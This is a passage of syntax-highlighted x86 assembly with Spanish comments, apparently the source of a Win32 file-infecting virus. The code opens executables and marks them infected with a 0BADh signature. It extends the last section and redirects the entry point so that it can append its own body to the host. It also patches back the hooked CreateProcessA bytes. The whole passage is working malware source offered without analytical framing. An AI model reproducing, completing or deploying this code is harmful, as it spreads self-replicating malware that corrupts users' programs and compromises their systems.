        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">hoste</span><span class="sc0">           </span><span class="sc1">;Abro el archivo</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">OPEN_EXISTING</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc5">GENERIC_READ</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">GENERIC_WRITE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                            
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newCreateFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,-</span><span class="sc2">1</span><span class="sc0">                         
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">emergencia</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ahand</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Guardo el handle</span><span class="sc0">


        </span><span class="sc1">; Busco el comienzo del PE header que est  en la posici¢n 3ch</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">03ch</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">moverpuntero</span><span class="sc0">

           </span><span class="sc1">; Leo la posici¢n del Pe header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">004h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheaderoffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lectura</span><span class="sc0">

           </span><span class="sc1">; Me muevo hasta el PE header</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheaderoffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">moverpuntero</span><span class="sc0">

         
           </span><span class="sc1">; Leo un poco del header para calcular todo el tama¤o del</span><span class="sc0">
           </span><span class="sc1">; pe header y object table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">058h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">lectura</span><span class="sc0">

      </span><span class="sc1">; Llevo el puntero al comienzo del PE header de nuevo</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0">  </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheaderoffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">moverpuntero</span><span class="sc0">

      </span><span class="sc1">; leo todo el pe header  y la object table</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">headersize</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0">   </span><span class="sc5">lectura</span><span class="sc0">  
      


      </span><span class="sc1">; Me aseguro que es un pe y que no est  infectado</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc4">],</span><span class="sc2">00004550h</span><span class="sc0">    </span><span class="sc1">; PE,0,0</span><span class="sc0">
      </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">notape</span><span class="sc0">
      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4ch</span><span class="sc4">],</span><span class="sc2">00badh</span><span class="sc0"> </span><span class="sc1">;si est  infectado salir</span><span class="sc0">
      </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">notape</span><span class="sc0">


       </span><span class="sc1">; marco el archivo como infectado en una zona del Header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4ch</span><span class="sc4">],</span><span class="sc2">00badh</span><span class="sc0">


     </span><span class="sc1">; Localizo el offset de la object table</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtHeaderSize</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">18h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ObjectTableoffset</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

     </span><span class="sc1">;relativo al comienzo del Pe header</span><span class="sc0">

        
     </span><span class="sc1">;Calculo el Offset del £ltimo  objecto de la tabla</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ObjectTableoffset</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">numObj</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">40d</span><span class="sc0">

      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">newobject</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">      </span><span class="sc1">;copio la entrada en la object table en memoria</span><span class="sc0">
    

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">physicalsize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ultfisicalsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">secphy</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc1">; Calcula el tama¤o fisico pa el ultimo object</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filealign</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">physicalsize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">viriisize</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">physicalsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virtualsize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">secdesplaza</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;el tama¤o virtual ser </span><span class="sc0">
                                                     </span><span class="sc1">;el desplazamiento dentro de la secci¢n</span><span class="sc0">
                    </span><span class="sc1">;RVA del objeto + desplazamiento virtual= entrypoint RVA   </span><span class="sc0">

         </span><span class="sc1">; calcula el tama¤o virtual del objeto modificado</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">objalign</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virtualsize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">viriisize</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virtualsize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">


         </span><span class="sc1">; Modifico la image size del archivo.</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">viriisize</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">imagesize</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">objalign</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">imagesize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; Copio el objeto modificado en el buffer</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsd</span><span class="sc0">


        </span><span class="sc1">; Calculo la nueva Entrypoint RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">secphy</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">entrypointRVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">entrypointRVA</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;le sumo la base adress</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">oldip</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

                              </span><span class="sc1">;completo la variable oldip para generar</span><span class="sc0">
                              </span><span class="sc1">;el jump al hoste</span><span class="sc0">
        

        </span><span class="sc1">; de nuevo al Pe header</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheaderoffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">moverpuntero</span><span class="sc0">
        
        </span><span class="sc1">; Escribo el pe header y la object table en el archivo</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">headersize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">peheader</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">escritura</span><span class="sc0">

        </span><span class="sc1">; Me voy al final del file para copiar el virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">physicaloffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ultfisicalsize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">moverpuntero</span><span class="sc0">


        </span><span class="sc1">; Copio el virus al final (de la ultima secci¢n)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">viriisize</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">startvirii</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">escritura</span><span class="sc0">


</span><span class="sc5">notape</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ahand</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newCloseFile</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">emergencia</span><span class="sc4">:</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0">  </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codigoparcheado</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">newCreateProcessA</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;pongo otra vez</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">                                </span><span class="sc1">;los 010h primeros bytes</span><span class="sc0">
          </span><span class="sc6">rep</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                                   </span><span class="sc1">;del api</span><span class="sc0">


          </span><span class="sc6">popad</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc0">

          </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">getdelta2</span><span class="sc0">               </span><span class="sc1">;obtengo el delta otra vez</span><span class="sc0">
</span><span class="sc5">getdelta2</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">                     
          </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">getdelta2</span><span class="sc0">


          </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">dirretorno</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">newCreateProcessA</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;llamo a la api</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">getdelta3</span><span class="sc0">               </span><span class="sc1">;obtengo el delta otra vez</span><span class="sc0">
</span><span class="sc5">getdelta3</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">ebp</span><span class="sc0">                     
